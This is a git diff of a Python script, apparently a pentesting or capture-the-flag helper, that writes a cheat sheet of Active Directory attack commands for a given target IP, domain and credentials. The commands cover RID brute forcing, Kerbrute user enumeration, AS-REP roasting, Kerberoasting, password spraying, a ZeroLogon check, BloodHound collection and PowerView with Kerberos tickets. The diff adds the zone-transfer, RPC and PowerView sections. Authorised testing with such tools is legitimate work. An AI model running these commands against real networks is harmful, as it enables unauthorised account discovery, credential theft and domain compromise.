@@ -14,32 +14,44 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
               TIME SINCE  2024
 
     """
-# Open the AD_output.txt file in write mode
+    # Open the AD_output.txt file in write mode
     with open('AD_output.txt', 'w') as f:
         f.write(ascii_art + '\n')
+
+        # Add the Zone Transfer section
+        f.write("# Zone transfer (Unlikely with AD)\n")
+        f.write(f"dig axfr {domain} @{target_ip}\n")
+        f.write("\n")
+
         # Write the RID brute force commands
-        f.write("# RID brute\n")
-        f.write(f"crackmapexec smb {domain} -u anonymous -p '' --rid-brute 10000\n")
+        f.write("# Guest RID brute\n")
+        f.write(f"netexec smb {domain} -u anonymous -p '' --rid-brute 10000\n")
         f.write(f"impacket-lookupsid {domain}/anonymous@{target_ip}\n")
-        # RID brute force command using credentials if provided
-        if user and password:
-            f.write(f"netexec smb {domain} -u {user} -p '{password}' --rid-brute 10000\n")
         f.write("\n")
 
         # If user credentials are provided, write commands using them
         if user and password:
-            f.write("# With credentials\n")
+            f.write("# Authenticated RID brute\n")
+            f.write(f"netexec smb {domain} -u {user} -p '{password}' --rid-brute 10000\n")
             f.write(f"impacket-lookupsid {domain}/{user}:'{password}'@{domain}\n")
-        f.write("\n")
+            f.write("\n")
 
         # Write Kerbrute user enumeration command
         f.write("# Kerbrute user enumeration\n")
         f.write(f"kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {target_ip}\n")
         f.write("\n")
 
+        # Write RPC Enumeration commands
+        f.write("# RPC Enumeration\n")
+        if user:
+            f.write(f"rpcclient -U \"{user}\" -N {target_ip}\n")
+        else:
+            f.write(f"rpcclient -U \"\" -N {target_ip}\n")
+        f.write("\n")
+
         # Write As-Rep Roasting command
         f.write("# AS Rep Roasting\n")
-        f.write(f"for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/{user} | grep -v Impacket; done\n")
+        f.write(f"for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n")
         f.write("\n")
 
         # Write Kerberoasting commands
@@ -49,7 +61,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         if user and password:
             f.write(f"faketime -f +7h GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
 
-        f.write(f"GetUserSPNs.py -no-preauth 'jjones' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
+        f.write(f"GetUserSPNs.py -no-preauth '{user}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
         f.write("\n")
 
         # Write password spraying command with provided password
@@ -63,7 +75,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         # Write LDAP enumeration commands
         f.write("# LDAP Enumeration\n")
         f.write(f"ldapsearch -x -H ldap://{target_ip} -b \"dc={domain.split('.')[0]},dc={domain.split('.')[1]}\" | grep 'userPrincipalName' | tr '@' ' ' | awk '{{print $2}}' > users.txt\n")
-        f.write(f"~/go/bin/kerbrute userenum --dc {hostname}.{domain} -d {domain} users.txt\n")
+        f.write(f"kerbrute userenum --dc {hostname}.{domain} -d {domain} users.txt\n")
         f.write("\n")
 
         # Write ZeroLogon check command
@@ -79,12 +91,21 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         f.write("\n")
 
         # Write Bloodhound Python command
-        f.write("# Bloodhound Python\n")
+        f.write("# Bloodhound Python injestor\n")
         if user and password:
             f.write(f"faketime -f +7h bloodhound-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n")
         else:
             f.write(f"faketime -f +7h bloodhound-python -c ALL -u 'guest' -p '' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n")
-    
+        f.write("\n")
+
+        # Write Powerview.py enumeration commands (only if creds are provided)
+        if user and password:
+            f.write("# Powerview.py enumeration\n")
+            f.write(f"faketime -f +7h getTGT.py {domain}/{user}:'{password}'\n")
+            f.write(f"export KRB5CCNAME=./{user}.ccache\n")
+            f.write(f"faketime -f +7h powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n")
+            f.write("\n")
+        
     print("AD_output.txt file generated successfully.")
 
 if __name__ == "__main__":
